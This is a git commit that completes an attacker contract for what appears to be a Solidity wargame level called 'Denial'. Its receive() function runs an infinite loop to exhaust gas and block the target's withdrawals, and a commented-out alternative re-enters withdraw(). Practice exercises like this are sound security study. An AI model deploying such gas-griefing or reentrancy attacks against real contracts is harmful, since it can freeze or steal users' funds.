c48d662c6afb8f37a71ab9c949f58db7a89cb45e
Adham <asorour@sfu.ca>
2023-05-21 22:44:50 -0700

    Denial Hacked

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -4,10 +4,22 @@ import "./Denial.sol";
 
 contract AttackingDenial {
     address payable public contractAddress;
+    Denial denial;
 
     constructor(address payable _contractAddress) {
         contractAddress = _contractAddress;
+        denial = Denial(contractAddress);
     }
 
-    //Code me!
+    receive() external payable {
+        /// METHOD 1
+        uint i = 0;
+        while (true) {
+            i++;
+        }
+        /// METHOD 2
+        // if (contractAddress.balance > 0) {
+        //     denial.withdraw();
+        // }
+    }
 }
